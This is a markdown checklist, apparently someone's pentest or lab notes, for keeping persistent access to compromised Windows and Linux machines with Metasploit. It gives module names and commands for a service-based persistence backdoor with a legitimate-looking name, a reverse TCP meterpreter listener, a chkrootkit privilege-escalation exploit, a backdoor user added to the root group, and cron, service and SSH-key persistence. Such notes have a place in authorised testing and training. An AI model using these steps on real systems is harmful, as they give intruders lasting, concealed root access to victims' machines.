## ✅ Persistence on Windows Checklist

- [ ] **Overview**
  - Technique to maintain persistent access even if credentials change or system restarts.
  - Requires **Administrator privileges**.

- [ ] **Gain Initial Access**
  - [ ] Obtain a meterpreter session on the target.

- [ ] **Find Persistence Modules**
  ```
  search platform:windows persistence
  ```

- [ ] **Select Exploit**
  ```
  use exploit/windows/local/persistence_service
  ```
  - [ ] Set `SERVICE_NAME` to something that appears legitimate.
  - [ ] Set payload to **32-bit** (upgrade later if needed).
  - [ ] Configure:
    ```
    set SESSION <id>
    set LHOST <ip>
    set LPORT <port>
    run
    ```
  - [ ] Result → Persistent service runs on victim, providing reverse TCP connection.

- [ ] **Post-Exploitation Access**
  - [ ] Start a listener:
    ```
    use multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <ip>
    set LPORT <port>
    run
    ```
  - [ ] Result → Immediate meterpreter session when victim restarts.

---

- [ ] **Privilege Escalation via chkrootkit**  
  - Check chkrootkit version → must be ≤ 0.5.0  
  - use `unix/local/chkrootkit`  
  - `set SESSION <id>  `
  - set CHKROOTKIT /bin/chkrootkit  
  - run exploit  
  - upgrade to meterpreter  

- [ ] **Create Backdoor User**  
  - useradd -m ftp -s /bin/bash  
  - passwd ftp pass  
  - groups root (check root's group)  
  - usermod -aG root ftp  

- [ ] **Persistence via Cronjobs**  
```
use linux/local/cron_persistence
set SESSION <id>  
set LHOST <attacker-ip>  
set LPORT <port>  
run exploit  
```

- [ ] **Persistence via Service**  
```
use linux/local/service_persistence
set SESSION <id>  
set LHOST <attacker-ip>  
set LPORT <port>  
test different targets  
```

- [ ] **SSH Key Persistence**  
```
- use `sshkey_persistence`  
  - set CREATE_SSH_FOLDER true  
  - set SESSION <id>  
  - run exploit  
  - msf> loot → get private key  
  - chmod 0400 ssh_key  
  - ssh -i ssh_key root@<target-ip> → persistent login  
```

---

